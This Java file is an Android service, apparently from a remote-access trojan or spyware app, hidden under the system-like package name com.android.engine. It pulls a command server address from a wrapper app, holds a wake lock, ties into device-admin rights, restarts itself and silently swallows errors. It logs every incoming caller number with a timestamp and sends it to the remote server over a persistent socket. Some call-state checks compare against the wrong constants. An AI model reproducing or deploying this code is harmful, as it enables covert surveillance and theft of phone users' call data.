package com.android.engine.service;

import Transfer.Action;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import com.android.engine.DeviceAdmin;
import com.android.engine.SendMasterCommunication;
import java.util.Date;

public class MyService extends Service {

  public static Context context;
  public static TelephonyManager telephonyManager;
  public static SharedPreferences androidEngineSharedPreferences;
  public static SharedPreferences wrapperAppSharedPreferences;
  public static ComponentName componentName;

  private SendMasterCommunication sendMasterCommunication;
  private boolean myServiceIsRunning;

  public MyService() {
    this.myServiceIsRunning = false;

    try {
      context = this;
    } catch (Exception e) {
    }
  }

  public IBinder onBind(Intent intent) {
    return null;
  }

  public void onCreate() {
    try {
      androidEngineSharedPreferences = getSharedPreferences("com.android.engine", 0);
      if (!androidEngineSharedPreferences.contains("DateOfInstallation")) {
        androidEngineSharedPreferences.edit()
            .putString("DateOfInstallation", new Date().toLocaleString())
            .commit();
      }

      if (!androidEngineSharedPreferences.contains("host")) {
        wrapperAppSharedPreferences =
            createPackageContext("com.app", 0).getSharedPreferences("com.app", 0);
        androidEngineSharedPreferences.edit()
            .putString("host", wrapperAppSharedPreferences.getString("host", "127.0.0.1"))
            .commit();
        androidEngineSharedPreferences.edit()
            .putInt("port", Integer.parseInt(wrapperAppSharedPreferences.getString("port", "4467")))
            .commit();
      }

      sendMasterCommunication =
          new SendMasterCommunication(androidEngineSharedPreferences.getString("host", "127.0.0.1"),
              androidEngineSharedPreferences.getInt("port", 4467));

      ((PowerManager) getSystemService(Context.POWER_SERVICE)).newWakeLock(1, "null").acquire();

      new Handler(Looper.getMainLooper()).post(new Runnable() {
        public void run() {
          MyService.telephonyManager =
              (TelephonyManager) MyService.context.getSystemService(Context.TELEPHONY_SERVICE);
          MyService.telephonyManager.listen(new PhoneStateListener() {
            public void onCallStateChanged(int flags, String incomingNumber) {
              try {
                Action action = new Action();
                action.DATA =
                    new String[] { incomingNumber, String.valueOf(System.currentTimeMillis()) };

                if (flags == LISTEN_SERVICE_STATE) {
                  action.ACTION = 82;
                } else if (flags == LISTEN_SIGNAL_STRENGTH) {
                  action.ACTION = 83;
                }
                SendMasterCommunication.sendAction(action);

                super.onCallStateChanged(flags, incomingNumber);
              } catch (Exception e) {
              }
            }
          }, 32);
        }
      });

      componentName = new ComponentName(this, DeviceAdmin.class);
    } catch (Exception e) {
    }
  }

  public int onStartCommand(Intent intent, int flags, int startId) {
    try {
      if (!this.myServiceIsRunning) {
        this.myServiceIsRunning = true;
        new Thread() {
          public void run() {
            SendMasterCommunication.startSocket();
          }
        }.start();
      }
    } catch (Exception e) {
    }

    return START_STICKY;
  }
}
